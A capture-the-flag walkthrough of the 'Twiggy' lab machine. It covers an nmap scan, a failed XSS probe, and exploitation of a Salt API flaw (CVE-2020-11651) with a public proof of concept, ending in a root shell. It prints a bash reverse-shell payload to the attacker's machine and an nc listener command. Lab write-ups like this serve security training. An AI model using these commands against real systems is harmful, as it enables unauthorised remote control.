<h2>Recon</h2>

<h3>PortScanning</h3>

>command used:sudo nmap -A -T4 -p- -v

```
# Nmap 7.93 scan initiated Sat Jan  7 10:06:55 2023 as: nmap -A -v -T4 -p- -oN twiggy 192.168.242.62
Nmap scan report for 192.168.242.62
Host is up (0.44s latency).
Not shown: 65529 filtered tcp ports (no-response)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.4 (protocol 2.0)
| ssh-hostkey: 
|   2048 447d1a569b68aef53bf6381773165d75 (RSA)
|   256 1c789d838152f4b01d8e3203cba61893 (ECDSA)
|_  256 08c912d97b9898c8b3997a19822ea3ea (ED25519)
53/tcp   open  domain  NLnet Labs NSD
80/tcp   open  http    nginx 1.16.1
|_http-favicon: Unknown favicon MD5: 11FB4799192313DD5474A343D9CC0A17
|_http-title: Home | Mezzanine
| http-methods: 
|_  Supported Methods: GET HEAD OPTIONS
|_http-server-header: nginx/1.16.1
4505/tcp open  zmtp    ZeroMQ ZMTP 2.0
4506/tcp open  zmtp    ZeroMQ ZMTP 2.0
8000/tcp open  http    nginx 1.16.1
|_http-open-proxy: Proxy might be redirecting requests
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Site doesn't have a title (application/json).
|_http-server-header: nginx/1.16.1
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Linux 3.X|4.X|5.X (89%)
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4.4 cpe:/o:linux:linux_kernel:5.1
Aggressive OS guesses: Linux 3.10 - 3.12 (89%), Linux 4.4 (89%), Linux 4.9 (89%), Linux 3.10 - 3.16 (86%), Linux 3.10 - 4.11 (85%), Linux 3.11 - 4.1 (85%), Linux 3.2 - 4.9 (85%), Linux 5.1 (85%)
No exact OS matches for host (test conditions non-ideal).
Uptime guess: 0.003 days (since Sat Jan  7 10:08:04 2023)
Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=264 (Good luck!)
IP ID Sequence Generation: All zeros

TRACEROUTE (using port 80/tcp)
HOP RTT       ADDRESS
1   698.61 ms 192.168.49.1
2   698.68 ms 192.168.242.62

Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sat Jan  7 10:12:07 2023 -- 1 IP address (1 host up) scanned in 312.17 seconds
```
From the scan above we have 6 opened ports. Port 22 which runs ssh, port 53 which runs domain, port 80,8000 which runs http, port 4505,4506 which runs zmtp. Our enumeration today will be focused more on the ports that runs the http service (port 80 and port 8000)



<h2>Enumeration Port 80</h2>

Going to the webpage you should see something like this

![image](https://user-images.githubusercontent.com/67879936/222254767-cb6402c0-737b-448a-a6d9-9f6af0fcad7d.png)

I went ahead to test the search button for xss by using a simple payload

>payload:<img src=x onerror=alert(1)>

![image](https://user-images.githubusercontent.com/67879936/222255982-60c0769f-1e21-4120-b7a4-e704f342f405.png)

oops, it didn't work. After looking around for a while I didn't find anything useful. On to the next port



<h2>Enumeration Port 8000</h2>

Going to the webpage should get you this

![image](https://user-images.githubusercontent.com/67879936/222257048-1c38e203-3f35-4b45-a6e7-ad8d25713c12.png)

lets check the header of the webpage using curl

>command:curl -v http://192.168.123.62:8000/

![image](https://user-images.githubusercontent.com/67879936/222257584-b91c54ab-2c73-48de-84e5-52e557a7fc2c.png)

Lets check if there's an exploit for this salt-api/3000-1

![image](https://user-images.githubusercontent.com/67879936/222259122-1681c469-29d1-469c-8d98-ac5a2ac8031b.png)

Yup, we sure found an exploit. Lets go ahead and exploit this vulnerability hehe



<h2>Exploitation</h2>

>Link to Exploit:https://github.com/jasperla/CVE-2020-11651-poc

To use this exploit, follow these steps

```
┌──(bl4ck4non㉿bl4ck4non)-[~/Downloads/PG/pg_practice/Twiggy]
└─$ git clone https://github.com/jasperla/CVE-2020-11651-poc
Cloning into 'CVE-2020-11651-poc'...
remote: Enumerating objects: 30, done.
remote: Counting objects: 100% (30/30), done.
remote: Compressing objects: 100% (20/20), done.
remote: Total 30 (delta 12), reused 26 (delta 10), pack-reused 0
Receiving objects: 100% (30/30), 8.61 KiB | 881.00 KiB/s, done.
Resolving deltas: 100% (12/12), done.
                                                                                                                                                                        
┌──(bl4ck4non㉿bl4ck4non)-[~/Downloads/PG/pg_practice/Twiggy]
└─$ cd CVE-2020-11651-poc 
                                                                                                                                                                        
┌──(bl4ck4non㉿bl4ck4non)-[~/…/PG/pg_practice/Twiggy/CVE-2020-11651-poc]
└─$ sudo pip3 install salt                            
[sudo] password for bl4ck4non: 
Requirement already satisfied: salt in /usr/local/lib/python3.11/dist-packages (3005.1)
Requirement already satisfied: Jinja2 in /usr/lib/python3/dist-packages (from salt) (3.0.3)
Requirement already satisfied: jmespath in /usr/local/lib/python3.11/dist-packages (from salt) (1.0.1)
Requirement already satisfied: msgpack!=0.5.5,>=0.5 in /usr/lib/python3/dist-packages (from salt) (1.0.3)
Requirement already satisfied: PyYAML in /usr/lib/python3/dist-packages (from salt) (6.0)
Requirement already satisfied: MarkupSafe in /usr/lib/python3/dist-packages (from salt) (2.1.1)
Requirement already satisfied: requests>=1.0.0 in /usr/lib/python3/dist-packages (from salt) (2.28.1)
Requirement already satisfied: distro>=1.0.1 in /usr/lib/python3/dist-packages (from salt) (1.8.0)
Requirement already satisfied: contextvars in /usr/local/lib/python3.11/dist-packages (from salt) (2.4)
Requirement already satisfied: psutil>=5.0.0 in /usr/local/lib/python3.11/dist-packages (from salt) (5.9.4)
Requirement already satisfied: pyzmq<=20.0.0 in /usr/local/lib/python3.11/dist-packages (from salt) (20.0.0)
Requirement already satisfied: pycryptodomex>=3.9.8 in /usr/lib/python3/dist-packages (from salt) (3.11.0)
Requirement already satisfied: immutables>=0.9 in /usr/local/lib/python3.11/dist-packages (from contextvars->salt) (0.19)
WARNING: Running pip as the 'root' user can result in broken permissions and conflicting behaviour with the system package manager. It is recommended to use a virtual environment instead: https://pip.pypa.io/warnings/venv
```
if you've done this. We can go ahead and run the exploit
bash -i >& /dev/tcp/192.168.49.123/80 0>&1
>command:python3 exploit.py --master 192.168.123.62  --exec "whoami"

![image](https://user-images.githubusercontent.com/67879936/222260340-916d298b-074f-4655-8d2c-207b0e3ae591.png)

Nice, we got the "whoami" command to run successfully. Now, lets use a reverse shell so we can get a shell back to our machine.

As usual we'll be using 2 different terminals

>payload:bash -i >& /dev/tcp/192.168.49.123/80 0>&1

>command terminal 1:python3 exploit.py --master 192.168.123.62  --exec "bash -i >& /dev/tcp/192.168.49.123/80 0>&1"

>command terminal 2:rlwrap nc -lvnp 80

![image](https://user-images.githubusercontent.com/67879936/222261192-359a5737-dffb-4837-9fa3-197015926e88.png)

![image](https://user-images.githubusercontent.com/67879936/222261310-1dc9bd58-fa0e-4d50-b908-2051ccaecd17.png)

Boom!!! We got a shell as root user

That will be all for todat
























































